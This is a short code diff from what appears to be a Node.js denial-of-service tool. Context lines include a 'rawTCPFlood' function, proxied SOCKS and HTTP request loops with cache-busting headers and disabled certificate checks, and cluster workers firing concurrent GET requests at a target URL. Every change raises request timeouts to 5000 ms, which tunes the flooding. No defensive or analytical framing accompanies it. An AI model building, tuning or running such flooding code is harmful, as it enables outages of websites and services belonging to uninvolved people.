@@ -201,7 +201,7 @@ function rawTCPFlood(host, port, threadId) {
 
 function socksRequest(url, agent) {
   return new Promise((resolve) => {
-    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: 1000, rejectUnauthorized: false }, (res) => {
+    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: 5000, rejectUnauthorized: false }, (res) => {
       res.resume();
       resolve({ status: res.statusCode });
     });
@@ -246,7 +246,7 @@ const fireHTTPRequest = (url, ctx) => {
       method: "GET",
       headers,
       agent,
-      timeout: 2000,
+      timeout: 5000,
       rejectUnauthorized: false,
     };
     const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
@@ -295,7 +295,7 @@ if (USE_CLUSTER && cluster.isWorker) {
         promises.push(socksRequest(url, ctx.agent));
       } else if (ctx.type === "http") {
         promises.push(
-          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(2000) })
+          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(5000) })
             .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
             .catch(() => null)
         );
